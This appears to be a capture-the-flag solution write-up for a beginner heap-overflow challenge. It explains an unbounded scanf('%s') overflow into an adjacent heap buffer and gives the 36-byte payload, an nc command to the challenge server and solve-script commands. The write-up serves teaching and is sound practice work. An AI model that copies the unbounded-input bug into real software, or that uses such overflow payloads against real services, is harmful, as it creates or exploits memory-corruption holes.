# Demo: Flip the Lock (heap-0) — Solution

**Tools:** nc, GDB, pwntools

This is the solving write-up, for a challenge that is already deployed.
How the challenge is built and deployed is in [`README.chall.md`](README.chall.md).
It is a deliberate twin of [`01-cylab-heap-0`](../01-cylab-heap-0) — same bug, different overflow distance — so solving it together makes the first core challenge quick.

## Goal

Overflow the diary buffer so it spills into `lock_state`, which wins as soon as it is no longer `"shut"`.

## The bug

`init()` allocates two adjacent heap buffers:

```c
diary_entry = malloc(DIARY_ENTRY_SIZE);   /* "meh." */
lock_state  = malloc(LOCK_STATE_SIZE);    /* "shut" */
```

`write_diary()` copies your input into `diary_entry` with `scanf("%s", diary_entry)`, which stops at whitespace, never at the buffer size.
So a long enough write runs off the end of `diary_entry` and into `lock_state`, which the allocator placed right after it.
`check_win()` prints the flag as soon as `lock_state` is anything other than `"shut"`, and nothing in the program ever assigns to it — so any overwrite wins.

## Finding the overflow distance

Do not guess it. The program's *Print Heap* option prints both addresses:

```text
diary_entry @ 0x...2a0
lock_state  @ 0x...2c0     (difference = 0x20 = 32 bytes)
```

The gap is 32 bytes: glibc rounded each 5-byte request up to a usable chunk and added metadata.
So 32 filler bytes reach `lock_state`, and anything after that overwrites `"shut"`.

## Solving it

All three forms do the same thing: write `32` filler bytes plus a few more (menu option 2), then print the flag (option 4).

### By hand, over nc

```console
nc 141.85.224.106 31000
```

1. Choose `1` (Print Heap) and subtract the two addresses to confirm the distance is 32.
1. Choose `2` (Write to diary) and send 32 `A`s followed by `XXXX`:
   `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAXXXX`
1. Choose `4` (Print Flag).

### Shell script

`solve/solve.sh` builds that input with `printf` and sends it:

```console
./solve.sh                      # against a local ./chall (uses the placeholder flag.txt)
./solve.sh 141.85.224.106 31000 # against the deployed service
```

### pwntools

`solve/exploit.py` does the same in Python:

```console
python3 exploit.py                                   # local ./chall
python3 exploit.py REMOTE HOST=141.85.224.106 PORT=31000
```

## References

* `man 3 scanf`, `man 3 malloc`
* [pwntools documentation](https://docs.pwntools.com/)
